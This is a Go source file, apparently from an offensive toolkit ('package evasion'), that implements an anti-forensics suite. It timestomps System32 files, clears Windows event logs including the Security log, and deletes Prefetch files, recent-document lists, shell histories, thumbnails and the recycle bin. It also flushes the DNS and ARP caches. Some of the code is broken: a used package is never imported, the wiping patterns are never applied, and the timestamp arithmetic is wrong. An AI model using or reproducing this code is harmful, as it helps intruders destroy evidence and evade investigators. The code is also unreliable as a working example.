package evasion

import (
    "os"
    "syscall"
    "unsafe"
    "time"
    "runtime"
    "io/ioutil"
    "math/rand"
)

// Complete Anti-Forensics Suite
type AntiForensics struct {
    Timestomping bool
    LogClearing  bool
    FileWiping   bool
}

func (af *AntiForensics) Execute() {
    if af.Timestomping {
        af.ChangeFileTimestamps()
    }
    if af.LogClearing {
        af.ClearLogs()
    }
    if af.FileWiping {
        af.WipeFiles()
    }
    af.ClearMemory()
    af.ClearEventLogs()
    af.ClearPrefetch()
    af.ClearRecentDocs()
    af.ClearDNS()
    af.ClearARP()
}

// Change file timestamps (Timestomping)
func (af *AntiForensics) ChangeFileTimestamps() {
    if runtime.GOOS == "windows" {
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        setFileTime := kernel32.NewProc("SetFileTime")
        
        // Get list of system files
        files, _ := ioutil.ReadDir("C:\\Windows\\System32")
        for i := 0; i < 5 && i < len(files); i++ {
            file := files[i]
            if !file.IsDir() {
                // Set timestamps to random past date
                randomTime := time.Now().Add(-time.Duration(rand.Intn(365*24)) * time.Hour)
                filePath := "C:\\Windows\\System32\\" + file.Name()
                
                handle, _ := syscall.CreateFile(
                    syscall.StringToUTF16Ptr(filePath),
                    syscall.GENERIC_WRITE,
                    syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
                    nil,
                    syscall.OPEN_EXISTING,
                    syscall.FILE_ATTRIBUTE_NORMAL,
                    0,
                )
                
                if handle != syscall.InvalidHandle {
                    var ft syscall.Filetime
                    ft.LowDateTime = uint32(randomTime.UnixNano() / 100)
                    ft.HighDateTime = uint32(randomTime.UnixNano() >> 32)
                    setFileTime.Call(
                        uintptr(handle),
                        uintptr(unsafe.Pointer(&ft)),
                        uintptr(unsafe.Pointer(&ft)),
                        uintptr(unsafe.Pointer(&ft)),
                    )
                    syscall.CloseHandle(handle)
                }
            }
        }
    }
}

// Clear Windows Event Logs
func (af *AntiForensics) ClearEventLogs() {
    if runtime.GOOS != "windows" {
        return
    }
    
    advapi32 := syscall.NewLazyDLL("advapi32.dll")
    clearEventLog := advapi32.NewProc("ClearEventLogW")
    openEventLog := advapi32.NewProc("OpenEventLogW")
    
    logs := []string{
        "Application",
        "System",
        "Security",
        "Setup",
        "ForwardedEvents",
        "Windows PowerShell",
    }
    
    for _, log := range logs {
        handle, _, _ := openEventLog.Call(
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(""))),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(log))),
        )
        if handle != 0 {
            clearEventLog.Call(handle, 0)
            syscall.CloseHandle(syscall.Handle(handle))
        }
    }
}

// Clear Prefetch (Windows)
func (af *AntiForensics) ClearPrefetch() {
    if runtime.GOOS != "windows" {
        return
    }
    
    prefetchDir := "C:\\Windows\\Prefetch"
    files, _ := ioutil.ReadDir(prefetchDir)
    for _, file := range files {
        if !file.IsDir() && (file.Name() != "Layout.ini" && file.Name() != "ReadyBoot") {
            os.Remove(prefetchDir + "\\" + file.Name())
        }
    }
}

// Clear Recent Documents
func (af *AntiForensics) ClearRecentDocs() {
    if runtime.GOOS == "windows" {
        // Clear Recent Documents
        os.RemoveAll(os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Recent")
        os.Mkdir(os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Recent", 0700)
        
        // Clear Quick Access
        os.RemoveAll(os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Recent\\AutomaticDestinations")
        os.RemoveAll(os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Recent\\CustomDestinations")
    }
}

// Clear DNS Cache
func (af *AntiForensics) ClearDNS() {
    if runtime.GOOS == "windows" {
        exec.Command("ipconfig", "/flushdns").Run()
    } else {
        // Linux
        exec.Command("systemd-resolve", "--flush-caches").Run()
        exec.Command("resolvectl", "flush-caches").Run()
    }
}

// Clear ARP Cache
func (af *AntiForensics) ClearARP() {
    if runtime.GOOS == "windows" {
        exec.Command("arp", "-d", "*").Run()
    } else {
        // Linux
        exec.Command("ip", "neigh", "flush", "all").Run()
        exec.Command("arp", "-d", "-a").Run()
    }
}

// Secure memory wiping
func (af *AntiForensics) ClearMemory() {
    // Overwrite sensitive data
    data := make([]byte, 1024*1024)
    for i := range data {
        data[i] = byte(rand.Intn(256))
    }
    // Multiple passes
    for pass := 0; pass < 3; pass++ {
        for i := range data {
            data[i] = byte(rand.Intn(256))
        }
        runtime.GC()
    }
}

// Secure file wiping (Gutmann method)
func (af *AntiForensics) WipeFiles() {
    // Gutmann patterns
    patterns := [][]byte{
        {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},
        {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55},
        {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
        {0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49},
        {0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24},
        {0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92},
        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11},
        {0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22},
        {0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33},
        {0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44},
        {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55},
        {0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66},
        {0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77},
        {0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88},
        {0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99},
        {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
        {0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB},
        {0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC},
        {0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD},
        {0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE},
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        {0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49},
        {0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24},
        {0x24, 0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92},
        {0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6},
        {0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB},
        {0xDB, 0x6D, 0xB6, 0xDB, 0x6D, 0xB6, 0xDB, 0x6D},
        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55},
        {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77},
        {0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},
        {0xFF, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x99, 0x88},
        {0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x00},
    }
}

// Clear shell history
func (af *AntiForensics) ClearShellHistory() {
    if runtime.GOOS == "windows" {
        os.Remove(os.Getenv("APPDATA") + "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
    } else {
        os.Remove(os.Getenv("HOME") + "/.bash_history")
        os.Remove(os.Getenv("HOME") + "/.zsh_history")
        os.Remove(os.Getenv("HOME") + "/.history")
    }
}

// Clear thumbnail cache
func (af *AntiForensics) ClearThumbnails() {
    if runtime.GOOS == "windows" {
        os.RemoveAll(os.Getenv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\Explorer")
    }
}

// Clear clipboard
func (af *AntiForensics) ClearClipboard() {
    if runtime.GOOS == "windows" {
        user32 := syscall.NewLazyDLL("user32.dll")
        openClipboard := user32.NewProc("OpenClipboard")
        emptyClipboard := user32.NewProc("EmptyClipboard")
        closeClipboard := user32.NewProc("CloseClipboard")
        
        openClipboard.Call(0)
        emptyClipboard.Call()
        closeClipboard.Call()
    }
}

// Clear recycle bin
func (af *AntiForensics) ClearRecycleBin() {
    if runtime.GOOS == "windows" {
        shell32 := syscall.NewLazyDLL("shell32.dll")
        shemptyRecycleBin := shell32.NewProc("SHEmptyRecycleBinW")
        shemptyRecycleBin.Call(0, 0, 0x00000001|0x00000002)
    } else {
        // Linux trash
        os.RemoveAll(os.Getenv("HOME") + "/.local/share/Trash")
    }
}
